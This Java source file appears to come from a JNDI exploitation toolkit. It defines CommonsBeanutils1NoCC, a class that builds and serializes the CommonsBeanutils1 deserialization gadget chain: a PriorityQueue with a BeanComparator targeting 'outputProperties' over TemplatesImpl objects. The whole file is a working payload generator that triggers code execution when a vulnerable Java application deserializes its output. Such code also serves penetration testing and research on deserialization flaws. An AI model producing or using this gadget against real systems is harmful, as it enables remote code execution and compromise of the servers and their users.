package map.jndi.gadget;

import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class CommonsBeanutils1NoCC {
    public static byte[] create(TemplatesImpl templatesImpl) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        beanComparator.setProperty("outputProperties");
        ReflectUtil.setFieldValue(priorityQueue, "queue", new Object[]{templatesImpl, templatesImpl});

        return SerializeUtil.serialize(priorityQueue);
    }
}
